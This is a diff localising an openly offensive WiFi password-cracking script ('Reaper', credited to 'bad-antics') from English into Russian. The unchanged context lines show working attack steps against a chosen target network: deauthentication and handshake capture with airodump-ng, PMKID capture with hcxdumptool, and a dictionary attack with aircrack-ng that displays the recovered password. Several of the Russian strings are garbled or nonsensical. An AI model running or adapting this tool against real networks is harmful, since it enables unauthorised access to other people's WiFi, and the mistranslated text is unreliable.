@@ -31,18 +31,18 @@ The password WILL fall.
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 Разработано: bad-antics"
 
-PROMPT "REAPER METHODS:
+PROMPT "МЕТОДЫ REAPER:
 
 1. Handshake Harvest
    (WPA/WPA2 4-way)
 
 2. PMKID Reap
-   (Clientless attack)
+   (Бессоватная атака)
 
-3. Full Assault
-   (Both methods)
+3. Полная атака
+   (Оба метода)
 
-Choose your scythe..."
+Выберите свою пись..."
 
 METHOD=$(NUMBER_PICKER "Method (1-3):" 3)
 
@@ -50,12 +50,12 @@ METHOD=$(NUMBER_PICKER "Method (1-3):" 3)
 nullsec_select_target
 [ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "No target!"; exit 1; }
 
-CONFIRMATION_DIALOG "REAP TARGET:
+CONFIRMATION_DIALOG "ОСКАБЛИВАТЬ ЦЕЛь:
 $SELECTED_SSID
 $SELECTED_BSSID
-Channel: $SELECTED_CHANNEL
+Канал: $SELECTED_CHANNEL
 
-Begin the harvest?"
+Начать сбор?"
 [ $? -ne 0 ] && exit 0
 
 INTERFACE="$IFACE"
@@ -88,8 +88,8 @@ PMKID_CAPTURED=0
 PASSWORD=""
 
 harvest_handshake() {
-    LOG "Harvesting handshake..."
-    SPINNER_START "Deauthing & capturing..."
+    LOG "Оскабливание handshake..."
+    SPINNER_START "Деаутентификация и полват..."
     
     # Start capture
     timeout 120 airodump-ng --bssid $SELECTED_BSSID -c $SELECTED_CHANNEL -w "$CAPTURE_FILE" $MON_IF 2>/dev/null &
@@ -114,8 +114,8 @@ harvest_handshake() {
 }
 
 harvest_pmkid() {
-    LOG "Harvesting PMKID..."
-    SPINNER_START "Waiting for PMKID..."
+    LOG "Оскабливание PMKID..."
+    SPINNER_START "Ожидание PMKID..."
     
     if command -v hcxdumptool &>/dev/null; then
         timeout 60 hcxdumptool -i $MON_IF -o "${CAPTURE_FILE}.pcapng" --filterlist_ap=$SELECTED_BSSID --filtermode=2 2>/dev/null
@@ -140,8 +140,8 @@ crack_capture() {
         return
     }
     
-    LOG "Cracking..."
-    SPINNER_START "Running dictionary attack..."
+    LOG "Взлом..."
+    SPINNER_START "Попытка словарных атак..."
     
     if [ $HANDSHAKE_CAPTURED -eq 1 ]; then
         RESULT=$(aircrack-ng -w "$WORDLIST" -b $SELECTED_BSSID "${CAPTURE_FILE}-01.cap" 2>/dev/null)
@@ -189,29 +189,29 @@ EOF
 airmon-ng stop $MON_IF 2>/dev/null
 
 if [ -n "$PASSWORD" ]; then
-    PROMPT "  ☠ HARVEST COMPLETE ☠
-━━━━━━━━━━━━━━━━━━━━━━━━━
-TARGET REAPED!
+    PROMPT "  ☠ ОСКАБЛивАНИЕ ЗАВЕРШЕНО ☠
+━━━━━━━━━━━━━━━━━━━━━━━
+ЦЕЛЬ ОСКАБЛеНА!
 
 SSID: $SELECTED_SSID
-PASSWORD: $PASSWORD
+ПАРОЛЬ: $PASSWORD
 
-Victory is yours.
+Победа ваша.
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 Разработано: bad-antics"
 else
-    PROMPT "REAPER REPORT
-━━━━━━━━━━━━━━━━━━━━━━━━━
-Harvest: $SELECTED_SSID
+    PROMPT "ОТЧЁТ REAPER
+━━━━━━━━━━━━━━━━━━━━━━━
+Оскабливание: $SELECTED_SSID
 
-Handshake: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "YES" || echo "NO")
-PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "YES" || echo "NO")
+Handshake: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "ДА" || echo "НЕТ")
+PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "ДА" || echo "НЕТ")
 
-Password not in wordlist
-or capture incomplete.
+Пароль не в словаре
+или полват неполный.
 
-Hash saved for offline
-cracking.
+Хеш сохранен для
+все оффлайне взлома.
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 Разработано: bad-antics"
 fi
